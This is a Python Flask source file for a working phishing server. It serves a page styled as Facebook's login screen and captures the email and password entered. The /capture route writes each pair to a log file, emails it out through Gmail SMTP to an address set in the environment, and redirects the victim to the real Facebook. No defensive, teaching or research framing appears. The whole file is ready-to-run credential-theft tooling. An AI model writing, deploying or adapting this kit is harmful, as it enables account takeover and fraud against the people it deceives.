import os
import datetime
import smtplib
from email.mime.text import MIMEText
from flask import Flask, request, redirect

app = Flask(__name__)

LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Log into Facebook</title>
  <style>
    body { margin: 0; font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; color: #1c1e21; }
    .wrap { display: flex; flex-direction: column; align-items: center; padding: 20px 16px; min-height:100vh; }
    .logo { color: #1877F2; font-size: 52px; font-weight: 700; letter-spacing: -2px; margin: 24px 0 10px; }
    .logo b { font-size: 60px; }
    .card { background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.12); padding: 22px; width: 100%; max-width: 396px; text-align: center; }
    .card h1 { font-size: 30px; margin: 6px 0 18px; color: #050505; }
    input { width: 100%; box-sizing: border-box; padding: 14px; margin-bottom: 10px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
    .btn { width: 100%; background: #1877F2; color: #fff; font-size: 20px; font-weight: 600; border: none; border-radius: 6px; padding: 12px; cursor: pointer; }
    .btn:active { background: #166fe5; }
    .forgot { color: #1877F2; text-decoration: none; font-size: 14px; margin-top: 14px; display: inline-block; }
    .or { width: 100%; border-top: 1px solid #dddfe2; margin: 16px 0; }
    .signup { background: #42b72a; color: #fff; font-size: 13px; font-weight: 600; border: none; border-radius: 6px; padding: 8px 18px; cursor: pointer; }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="logo"><b>f</b>acebook</div>
    <div class="card">
      <h1>Log in to Facebook</h1>
      <form action="/capture" method="POST">
        <input type="text" name="email" placeholder="Email or phone number" autocomplete="username" required />
        <input type="password" name="pass" placeholder="Password" autocomplete="current-password" required />
        <button type="submit" class="btn">Log In</button>
      </form>
      <a class="forgot" href="https://www.facebook.com/recover/initiate">Forgotten password?</a>
      <div class="or"></div>
      <button class="signup">Create new account</button>
    </div>
  </div>
</body>
</html>
"""

REDIRECT_URL = os.environ.get("REDIRECT_URL", "https://www.facebook.com/")
LOG_FILE = os.environ.get("LOG_FILE", "captured.txt")
SMTP_USER = os.environ.get("SMTP_USER", "")
SMTP_PASS = os.environ.get("SMTP_PASS", "")
CAPTURE_TO = os.environ.get("CAPTURE_TO", "")


def send_email(text):
    if not (SMTP_USER and SMTP_PASS and CAPTURE_TO):
        return
    try:
        msg = MIMEText(text)
        msg["Subject"] = "New Facebook Login Capture"
        msg["From"] = SMTP_USER
        msg["To"] = CAPTURE_TO
        server = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.sendmail(SMTP_USER, CAPTURE_TO, msg.as_string())
        server.quit()
    except Exception:
        pass


@app.route("/")
def index():
    return LOGIN_PAGE


@app.route("/capture", methods=["POST"])
def capture():
    email = request.form.get("email", "")
    password = request.form.get("pass", "")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open(LOG_FILE, "a") as f:
        f.write(f"{timestamp} | {email} | {password}\n")

    send_email(f"Time: {timestamp}\nEmail: {email}\nPassword: {password}")

    return redirect(REDIRECT_URL)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
